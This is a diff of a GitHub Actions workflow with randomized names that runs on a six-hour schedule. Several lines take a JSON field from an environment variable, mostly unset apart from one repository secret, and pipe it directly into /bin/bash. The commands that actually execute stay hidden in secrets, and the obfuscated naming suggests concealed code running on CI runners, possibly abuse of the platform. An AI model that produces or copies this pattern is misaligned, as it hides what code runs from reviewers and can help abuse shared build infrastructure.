@@ -1,9 +1,10 @@
 name: jiangjidong3219
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
-jobs:  # 2741
+    - cron: '6 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,20 +12,15 @@ jobs:  # 2741
       - uses: actions/checkout@v4
       - name: jiangjidong3219
         env:
-          wu02840: ${{ secrets.wu02840 }}
+          fmzu7: ${{ secrets.fmzu7 }}
         run: |
-          echo $wu02840 | jq -r .crzo73724 | /bin/bash
-          echo $jnh3 | jq -r .dcog4 | /bin/bash
-          echo $ti191 | jq -r .jmatp742 | /bin/bash
-          echo $vmwcu8391 | jq -r .gct149 | /bin/bash
-          echo $kdw8826 | jq -r .kg9781 | /bin/bash
-          echo $rnrd69 | jq -r .py7621 | /bin/bash
-          echo $or816 | jq -r .wxw67 | /bin/bash
-          echo $sti6347 | jq -r .pcca14072 | /bin/bash
-          echo $uvqe45 | jq -r .e847 | /bin/bash
-          echo $ndn30402 | jq -r .nw2 | /bin/bash
-          echo $b27502 | jq -r .mnohl69 | /bin/bash
-          echo $pqcnx63 | jq -r .jmz2185 | /bin/bash
-          echo $y65347 | jq -r .f8 | /bin/bash
-          echo $jb0 | jq -r .qjizd94084 | /bin/bash
+          echo $fmzu7 | jq -r .rkjid399 | /bin/bash
+          echo $igomc44 | jq -r .robdq37 | /bin/bash
+          echo $ygg96209 | jq -r .vfqtf98378 | /bin/bash
+          echo $txs8 | jq -r .b5 | /bin/bash
+          echo $khnh4348 | jq -r .dfhua9527 | /bin/bash
+          echo $za75 | jq -r .ga5 | /bin/bash
+          echo $h55 | jq -r .f190 | /bin/bash
+          echo $sl17918 | jq -r .tdxd01149 | /bin/bash
+          echo $r76471 | jq -r .qrvnt24 | /bin/bash
 
